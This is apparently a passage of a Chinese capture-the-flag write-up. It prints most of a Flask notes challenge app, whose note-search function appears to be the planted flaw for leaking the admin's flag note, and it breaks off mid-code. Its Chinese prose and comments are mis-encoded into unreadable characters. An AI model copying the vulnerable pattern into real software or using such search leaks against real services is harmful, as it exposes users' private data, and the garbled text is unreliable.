&lt;p>‰∏Ä‰∏™flaskÔºåÊúâÊèê‰∫§notesÁöÑÂú∞ÊñπÔºåÂ∞ùËØïSSTIÂ§±Ë¥•&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211214000607181.png" alt="image-20211214000607181">&lt;/p>
&lt;p>Áúã‰ª£Á†ÅÈÄªËæëÊ≤°Êúâ‰ªÄ‰πàÁâπÂà´ÁöÑ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">send_from_directory&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">render_template&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sqlite3&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">subprocess&lt;/span>
&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">static_url_path&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;/static&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">static_folder&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;static&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">template_folder&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;templates&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">secret_key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">getenv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;SECRET&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;secret&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># secret passwdÂú®ÁéØÂ¢ÉÂèòÈáè‰∏≠&lt;/span>
&lt;span style="color:#111">ADMIN_PASS&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">getenv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ADMIN_PASS&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;password&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;flag.txt&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#75715e"># flag is here&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">init_db&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">con&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sqlite3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">connect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/tmp/database.db&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># sqliteÊï∞ÊçÆÂ∫ì&lt;/span>
&lt;span style="color:#111">cur&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">con&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cursor&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">cur&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT NOT NULL UNIQUE, password TEXT NOT NULL)&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">cur&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;INSERT INTO USERS (username, password) VALUES (&amp;#34;admin&amp;#34;, ?)&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">ADMIN_PASS&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#75715e"># ÊèíÂÖ•adminË¥¶Âè∑ÂØÜÁ†Å&lt;/span>
&lt;span style="color:#111">cur&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;CREATE TABLE IF NOT EXISTS notes (title TEXT NOT NULL, content TEXT NOT NULL, owner TEXT NOT NULL)&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">cur&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;INSERT INTO notes (title, content, owner) VALUES (&amp;#34;flag&amp;#34;, ?, 1)&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#75715e"># ÊèíÂÖ•flagËøõÂÖ•notesË°®&lt;/span>
&lt;span style="color:#111">con&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">commit&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">con&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">try_login&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">):&lt;/span> &lt;span style="color:#75715e"># ‰ªéÊï∞ÊçÆÂ∫ì‰∏≠ÁúãÊúâÊ≤°ÊúâÂåπÈÖçÁöÑË¥¶Âè∑ÂØÜÁ†Å ËøîÂõûÁ¨¨‰∏ÄÊù° ‰∏çÂ≠òÂú®Ë¶ÜÁõñ&lt;/span>
&lt;span style="color:#111">con&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sqlite3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">connect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/tmp/database.db&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">cur&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">con&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cursor&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">cur&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;SELECT * FROM users WHERE username = ? AND password = ?&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#111">row&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cur&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">fetchone&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">row&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">row&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">row&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]}&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">try_register&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">):&lt;/span> &lt;span style="color:#75715e"># ÊèíÂÖ•Êñ∞ÁöÑÁî®Êà∑ÂêçÊï∞ÊçÆËøõÂÖ•usersË°®&lt;/span>
&lt;span style="color:#111">con&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sqlite3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">connect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/tmp/database.db&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">cur&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">con&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cursor&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">cur&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;INSERT INTO users (username, password) VALUES (?, ?)&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#111">sqlite3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">IntegrityError&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">None&lt;/span>
&lt;span style="color:#111">con&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">commit&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">con&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">find_note&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">user&lt;/span>&lt;span style="color:#111">):&lt;/span> &lt;span style="color:#75715e"># ÂØªÊâæuserÁöÑnote&lt;/span>
&lt;span style="color:#111">con&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sqlite3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">connect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/tmp/database.db&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">cur&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">con&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cursor&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">cur&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;SELECT title, content FROM notes WHERE owner = ? AND (INSTR(content, ?) OR INSTR(title,?))&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">user&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#111">rows&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cur&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">fetchone&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">rows&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">get_notes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">user&lt;/span>&lt;span style="color:#111">):&lt;/span> &lt;span style="color:#75715e"># ÂæóÂà∞userÁöÑÂÖ®ÈÉ®notes&lt;/span>
&lt;span style="color:#111">con&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sqlite3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">connect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/tmp/database.db&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">cur&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">con&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cursor&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">cur&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;SELECT title, content FROM notes WHERE owner = ?&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">user&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#111">rows&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cur&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">fetchall&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">rows&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">create_note&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">title&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">content&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">user&lt;/span>&lt;span style="color:#111">):&lt;/span> &lt;span style="color:#75715e"># ÂàõÂª∫userÁöÑnoteËøõÂÖ•notesË°®&lt;/span>
&lt;span style="color:#111">con&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sqlite3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">connect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/tmp/database.db&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">cur&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">con&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cursor&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">cur&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;SELECT title FROM notes where title=? AND owner=?&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">title&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">user&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#111">row&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cur&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">fetchone&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">row&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">False&lt;/span>
&lt;span style="color:#111">cur&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;INSERT INTO notes (title, content, owner) VALUES (?, ?, ?)&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">title&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">content&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">user&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#111">con&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">commit&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">con&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">before_first_request&lt;/span> &lt;span style="color:#75715e"># ËØ∑Ê±Ç‰πãÂâçÂÖàÂà†Èô§/tmp/database.db ‰πãÂêéÂàùÂßãÂåñ&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">setup&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">remove&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/tmp/database.db&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">pass&lt;/span>
&lt;span style="color:#111">init_db&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">after_request&lt;/span> &lt;span style="color:#75715e"># ËøîÂõûÂìçÂ∫îÊó∂ÈíàÂØπcacheÊ∑ªÂä†no-storeÁöÑÂìçÂ∫îÂ§¥&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">add_headers&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">response&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;Cache-Control&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;no-store&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">response&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/login&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># Ê≤°ÊúâsessionËÆ∞ÂΩïÂÖàÁôªÂΩï&lt;/span>
&lt;span style="color:#111">notes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">get_notes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#75715e"># session[&amp;#39;id&amp;#39;]‰∏≠Â≠òÂÇ®id session[&amp;#39;username&amp;#39;]‰∏≠Â≠òÂÇ®username&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">notes&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">notes&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">message&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;select a note to fancify!&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># Êó†ËøáÊª§‰ΩÜÊòØ‰∏çÂ≠òÂú®SSTI&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/login&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;GET&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">login&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;GET&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;login.html&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;password&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">user&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">try_login&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># ÂåπÈÖçadminÊàñflag&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">user&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">user&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">user&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;login.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">message&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;login failed!&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/register&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;GET&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">register&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;GET&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
